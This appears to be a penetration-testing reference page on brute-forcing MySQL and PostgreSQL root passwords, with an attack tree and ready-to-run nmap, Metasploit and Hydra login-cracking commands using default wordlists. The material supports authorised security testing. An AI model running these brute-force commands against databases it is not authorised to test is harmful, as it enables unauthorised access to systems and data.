# Cracking the database root password

## Attack tree

```text
1 Cracking the database root password
    1.1 Try logging in as root without password and with default passwords
    1.2 Try common passwords
    1.3 Use a brute forcing tool
        1.3.1 External - run a tool
        1.3.2 Internal (having an account on the server that hosts the database) - run a hash cracker like John the Ripper against the database’s password file. The location of the hash file is different depending on the database.
    1.4 If it is Open Source Software, check the source code on the repository host.
```

## Nmap

`nmap` uses default password and user lists, but do plug in other lists:

### MySQL
Reduce the pool of users for the brute-force attack by [user enumeration](../enum/databases.md).

```text
# nmap --script mysql-brute <target>
--script-args userdb=<path> - plug in list of logins
--script-args passdb=<path> - plug in list of passwords
```

### PostgreSQL
```text
# nmap -p 5432 --script pgsql-brute <target>
```

## Metasploit

### MySQL
```text
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set USER_FILE /root/login/logins
msf auxiliary(mysql_login) > set PASS_FILE /root/login/password
msf auxiliary(mysql_login) > set RHOSTS <target>
msf auxiliary(mysql_login) > exploit
```

### PostgreSQL
```text
msf > use auxiliary/scanner/postgres/postgres_login
msf auxiliary(postgres_login) > set BLANK_PASSWORDS True
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS True
msf auxiliary(postgres_login) > set threads 100
msf auxiliary(postgres_login) > set RHOSTS <target>
msf auxiliary(postgres_login) > run
```

## Hydra

### PostgreSQL

```text
# hydra -L /path/to/user.txt -P /path/to/pass.txt <target> postgres
# hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt <target> postgres
-L: path for username list
-P: path for the password list
```

## Tools

* [Metasploit framework](https://www.kali.org/tools/metasploit-framework/)
* [Hydra](https://www.kali.org/tools/hydra/)
* [Medusa](https://www.kali.org/tools/medusa/)
* [Patator](https://www.kali.org/tools/patator/)
* [Ncrack](https://www.kali.org/tools/ncrack/)

## Resources

* [Collected common password lists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
* [SecLists](https://github.com/danielmiessler/SecLists)
* [Script pgsql-brute](https://nmap.org/nsedoc/scripts/pgsql-brute.html)
* [Script mysql-brute](https://nmap.org/nsedoc/scripts/mysql-brute.html)

